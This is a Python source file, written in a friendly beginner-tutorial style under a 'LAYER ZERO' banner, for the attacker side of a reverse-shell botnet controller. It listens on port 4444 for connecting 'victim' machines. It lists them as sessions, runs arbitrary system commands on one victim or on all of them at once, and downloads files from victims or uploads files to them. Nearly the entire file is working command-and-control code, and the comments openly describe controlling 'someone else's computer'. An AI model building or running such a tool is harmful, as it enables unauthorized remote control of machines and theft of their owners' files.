# ============================================================================================
# LIBRARY IMPORTS - These are tools other programmers created that we can use
# ============================================================================================
# Think of libraries like toolboxes - they give us ready-made tools so we don't have to
# build everything from scratch!

import socket    # Allows our program to communicate over the internet/network
import json      # Helps us organize data in a format that's easy to send and receive
import base64    # Converts files into text format so we can send them over the network
import threading # Lets our program do multiple things at once (like listening for connections while also accepting commands)


# ============================================================================================
# COLOR CODES - These make our terminal output colorful!
# ============================================================================================
# ANSI escape codes let us add colors to text in the terminal
# They work by sending special character sequences that tell the terminal to change color

GREEN = '\033[92m'   # Green color - for success messages and banner
YELLOW = '\033[93m'  # Yellow color - for informational messages
RED = '\033[91m'     # Red color - for error messages
RESET = '\033[0m'    # Reset to default color - always use this after colored text!


# ============================================================================================
# BANNER - This is the cool ASCII art that displays when the program starts
# ============================================================================================
# The 'r' before the quotes tells Python: "treat all backslashes as regular characters"
# Without the 'r', Python would think the backslashes mean something special and mess up our art!

BANNER = r''' 
 ____ ____ ____ ____ ____ _________ ____ ____ ____ ____ 
||L |||A |||Y |||E |||R |||       |||Z |||E |||R |||O ||
||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|
'''


# ============================================================================================
# HELP MENUS - Display available commands to the user
# ============================================================================================

def show_center_help():
    """Display help menu for the main command center"""
    print(YELLOW + "\n╔══════════════════════════════════════════════════════════════════╗")
    print("║                    COMMAND CENTER - HELP MENU                    ║")
    print("╚══════════════════════════════════════════════════════════════════╝" + RESET)
    print(GREEN + "\nAvailable Commands:" + RESET)
    print(YELLOW + "  targets" + RESET + "         - List all connected victim computers")
    print(YELLOW + "  session <#>" + RESET + "     - Connect to a specific victim (e.g., 'session 0')")
    print(YELLOW + "  sendall <cmd>" + RESET + "   - Send a command to ALL victims at once and returns their outputs")
    print(YELLOW + "  help" + RESET + "            - Show this help menu")
    print(YELLOW + "  quit" + RESET + "            - Close all connections and exit the program\n")

def show_shell_help():
    """Display help menu for the victim shell"""
    print(YELLOW + "\n╔══════════════════════════════════════════════════════════════════╗")
    print("║                      VICTIM SHELL - HELP MENU                    ║")
    print("╚══════════════════════════════════════════════════════════════════╝" + RESET)
    print(GREEN + "\nAvailable Commands:" + RESET)
    print(YELLOW + "  <any command>" + RESET + "   - Run any system command (e.g., 'ls', 'pwd', 'whoami')")
    print(YELLOW + "  cd <path>" + RESET + "       - Change directory on the victim computer")
    print(YELLOW + "  download <file>" + RESET + " - Download a file from the victim to your computer")
    print(YELLOW + "  upload <file>" + RESET + "   - Upload a file from your computer to the victim")
    print(YELLOW + "  help" + RESET + "            - Show this help menu")
    print(YELLOW + "  exit" + RESET + "            - Exit victim shell and return to Command Center\n")


# ============================================================================================
# FUNCTION: sendtoall
# ============================================================================================
# PURPOSE: Send the same message to all connected victim computers at once
# 
# HOW IT WORKS:
# 1. Takes your message and converts it to JSON (a format computers like to use)
# 2. Goes through each connected victim one by one
# 3. Sends the message to each victim

def sendtoall(targets, data):
    json_data = json.dumps(data)                    # Step 1: Convert data to JSON format (like packaging it for shipping)
    for target in targets:                          # Step 2: Loop through each victim computer in our list
        target.send(json_data.encode('utf-8'))      # Step 3: Send the packaged data to this victim


# ============================================================================================
# FUNCTION: run
# ============================================================================================
# PURPOSE: This lets you control a single victim computer - send commands and get results
# 
# THINK OF IT LIKE: Having a remote control for someone else's computer!
# You can type commands like "ls" or "pwd" and see what happens on their computer

def run(target, ip):
    
    # ------------------
    # Mini-function inside run: send
    # ------------------
    def send(data):
        json_data = json.dumps(data)
        target.send(json_data.encode('utf-8'))

    # ------------------
    # Mini-function inside run: recieve
    # ------------------
    def recieve():
        json_data = ''
        while True:
            try:
                json_data += target.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    # ------------------
    # Display session header
    # ------------------
    print(GREEN + f'\n[+] Connected to Session at {ip[0]}' + RESET)
    print(YELLOW + "[+] Type 'help' for available commands, 'back' to return to Command Center" + RESET)

    # ------------------
    # Main interaction loop
    # ------------------
    while True:
        command = input(f'Shell#{ip[0]}: ')  # More descriptive prompt
        
        if command.strip() == '':  # Ignore empty commands
            continue
        
        if command == 'help':
            show_shell_help()
            continue
        
        if command == 'back':  # NEW: Return to Command Center without killing victim
            print(YELLOW + '[+] Returning to Command Center...' + RESET)
            break
        
        send(command)
        
        if command == 'exit':
            print(YELLOW + '[!] Closing victim connection...' + RESET)
            break
        
        elif command[:2] == 'cd' and len(command) > 1:
            # For cd, we still need to receive the response (even if empty)
            # to stay in sync
            try:
                result = recieve()
                if result:  # Only print if there's an error message
                    print(result)
            except:
                pass
        
        elif command[:8] == 'download':
            try:
                file_data = recieve()
                with open(command[9:], 'wb') as file:
                    file.write(base64.b64decode(file_data))
                print(GREEN + f'[+] File downloaded: {command[9:]}' + RESET)
            except Exception as e:
                print(RED + f'[-] Download failed: {str(e)}' + RESET)
        
        elif command[:6] == 'upload':
            try:
                with open(command[7:], 'rb') as file:
                    send(base64.b64encode(file.read()).decode('utf-8'))
                result = recieve()  # Get confirmation from victim
                print(GREEN + f'[+] File uploaded: {command[7:]}' + RESET)
            except FileNotFoundError:
                print(RED + f'[-] File not found: {command[7:]}' + RESET)
            except Exception as e:
                print(RED + f'[-] Upload failed: {str(e)}' + RESET)
        
        else:
            try:
                result = recieve()
                if isinstance(result, str):
                    print(result)
                else:
                    print(str(result))
            except Exception as e:
                print(RED + f'[-] Error receiving response: {str(e)}' + RESET)


# ============================================================================================
# FUNCTION: server
# ============================================================================================
# PURPOSE: This function runs in the background, constantly watching for new victim computers
#          trying to connect to us
# 
# THINK OF IT LIKE: A bouncer at a club door - always watching for new people trying to get in!
# 
# WHY IT RUNS IN BACKGROUND: We need to accept new connections while ALSO letting you type
#                            commands. Threading lets us do both at the same time!

def server():
    global clients                                          # We need to access the 'clients' variable from outside this function
    
    while True:                                             # Keep watching for new connections forever
        if stop_server:                                     # Check if we need to shut down
            break                                           # If yes, stop the loop and exit
        
        sock.settimeout(1)                                  # Only wait 1 second for a connection before checking stop_server again
        
        try:
            target, ip = sock.accept()                      # Wait for a victim to connect (this pauses here until someone connects)
            targets.append(target)                          # Add this victim's connection to our list
            ips.append(ip)                                  # Add this victim's IP address to our list
            print(GREEN + str(targets[clients]) + '--' + str(ips[clients]) + ' has connected' + RESET)  # Success message in GREEN!
            clients += 1                                    # Count how many victims we have
            
        except:                                             # If no one connected in that 1 second
            pass                                            # Just continue the loop (no big deal)


# ============================================================================================
# MAIN PROGRAM SETUP
# ============================================================================================
# This is where we set everything up before the program actually starts running

global sock                                                 # Make 'sock' available everywhere in our program
ips = []                                                    # Empty list - we'll add victim IP addresses here as they connect
targets = []                                                # Empty list - we'll add victim connections here as they connect

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # Create a socket (think of it as a phone line for computers)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allow us to reuse the same port if we restart the program quickly
sock.bind(('0.0.0.0', 4444))                                # Listen on ALL network interfaces on port 4444
                                                            # 0.0.0.0 means "accept connections from anywhere"
                                                            # 4444 is the "phone number" victims will call
sock.listen()                                               # Start listening for incoming connections

clients = 0                                                 # Counter: how many victims have connected so far? (starts at 0)
stop_server = False                                         # Flag: should the background server stop? (starts as False)

print(GREEN + BANNER + RESET)                               # Show our cool ASCII art banner in GREEN
print(YELLOW + '[+] Waiting for targets to connect...' + RESET)  # Informational message in YELLOW
print(YELLOW + "[+] Type 'help' for a list of available commands" + RESET)  # Hint for new users

thread = threading.Thread(target=server)                    # Create a background worker that will run the 'server' function
thread.start()                                              # Start that background worker (now it's watching for connections!)


# ============================================================================================
# MAIN COMMAND CENTER
# ============================================================================================
# This is the main control panel! You can type commands here to manage your connected victims
#
# AVAILABLE COMMANDS:
#   - targets       : See all connected victims
#   - session #     : Control a specific victim (replace # with their session number)
#   - sendall       : Send a command to ALL victims at once
#   - help          : Display the help menu
#   - quit          : Close everything and exit the program

while True:                                                 # Keep showing the command prompt forever (until we quit)
    command = input('*Center: ')                            # Show prompt and wait for you to type a command
    
    # ------------------
    # COMMAND: targets
    # ------------------
    # Shows you a list of all victims that are connected
    if command == 'targets':
        count = 0                                           # Start counting from 0
        for ip in ips:                                      # Go through each victim's IP address
            print(YELLOW + 'Session ' + str(count) + '-----' + str(ip) + RESET)  # Informational message in YELLOW
            count += 1                                      # Move to the next number
    
    # ------------------
    # COMMAND: help
    # ------------------
    # Shows the help menu with all available commands
    elif command == 'help':
        show_center_help()                                  # Display the command center help menu
    
    # ------------------
    # COMMAND: session #
    # ------------------
    # Lets you control a specific victim (like 'session 0' or 'session 1')
    elif command[:7] == 'session':
        try:
            num = int(command[8:])                          # Get the number you typed (the part after 'session ')
            tarnum = targets[num]                           # Get that victim's connection
            tarip = ips[num]                                # Get that victim's IP
            run(tarnum, tarip)                              # Start controlling that victim!
        except:                                             # If something went wrong (bad number, victim doesn't exist, etc.)
            print(RED + '[-] Invalid session' + RESET)      # Error message in RED
    
    # ------------------
    # COMMAND: quit
    # ------------------
    # Shuts down everything cleanly and exits the program
    elif command == 'quit':
        for target in targets:                              # Go through each connected victim
            target.close()                                  # Disconnect from them nicely
        sock.close()                                        # Close our main listening socket
        stop_server = True                                  # Tell the background server to stop
        thread.join()                                       # Wait for the background server to finish
        break                                               # Exit this loop (which ends the program)
    
    # ------------------
    # COMMAND: sendall
    # ------------------
    # Sends the same command to ALL victims at once
    elif command[:7] == 'sendall':
        cmd = command[8:]                                   # Get the command you typed (the part after 'sendall ')

        if cmd.strip() == '':                               # Check if command is empty
            print(RED + '[!] No command provided' + RESET)
            continue

        try:
            sendtoall(targets, cmd)                         # Send command to everyone
            print(GREEN + f'[+] Command sent to {len(targets)} target(s)' + RESET) # Success message in GREEN!
            
            # Collect responses from all targets
            for i, target in enumerate(targets):            # Go through each victim one by one
                try:
                    target.settimeout(5)                    # Wait max 5 seconds for response
                    json_data = ''                          # Start with empty response
                    while True:                             # Keep trying until we get a complete message
                        try:
                            json_data += target.recv(1024).decode('utf-8')
                            result = json.loads(json_data)
                            break
                        except ValueError:
                            continue
                    
                    print(YELLOW + f'\n--- Response from Session {i} ({ips[i][0]}) ---' + RESET)
                    print(result)
                    
                except socket.timeout:
                    print(RED + f'[!] Session {i} timed out' + RESET)
                except Exception as e:
                    print(RED + f'[!] Error receiving from Session {i}: {str(e)}' + RESET)
            
            print(GREEN + '\n[+] All responses received' + RESET)
            
        except Exception as e: # If sending failed for some reason
            print(RED + f'[!] Send to all failed: {str(e)}' + RESET) # Error message in RED
    
    # ------------------
    # UNKNOWN COMMAND
    # ------------------
    # If you typed something we don't recognize
    else:
        print(RED + '[!!!] Invalid command' + RESET)        # Error message in RED
